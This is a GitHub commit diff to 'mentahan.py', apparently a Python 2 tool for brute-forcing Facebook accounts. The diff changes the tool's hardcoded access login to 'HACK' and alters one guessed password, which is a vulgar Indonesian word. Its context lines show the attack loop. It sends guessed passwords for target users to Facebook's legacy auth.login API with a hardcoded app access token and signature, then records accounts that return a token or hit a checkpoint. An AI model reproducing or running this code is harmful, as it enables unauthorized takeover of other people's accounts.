247908c66dc1126c9f555ba8b4dd64ce4dac0ae6
mrferi21 <66431142+mrferi21@users.noreply.github.com>
2020-06-04 23:18:49 +0700

    Add files via upload

--- mentahan.py
+++ mentahan.py
@@ -88,8 +88,8 @@ print """\033[1;97m=====================================================>\033[1;
 print "\x1b[1;97m=====================================================>●⚀◇-------------------------------------------------◇⚀●⚀●=========>"
 
 
-CorrectUsername = "ANBIA01"
-CorrectPassword = "AMANDA01"
+CorrectUsername = "HACK"
+CorrectPassword = "HACK"
 
 loop = 'true'
 while (loop == 'true'):
@@ -395,7 +395,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Kontol'
+													pass6 = 'kontol'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
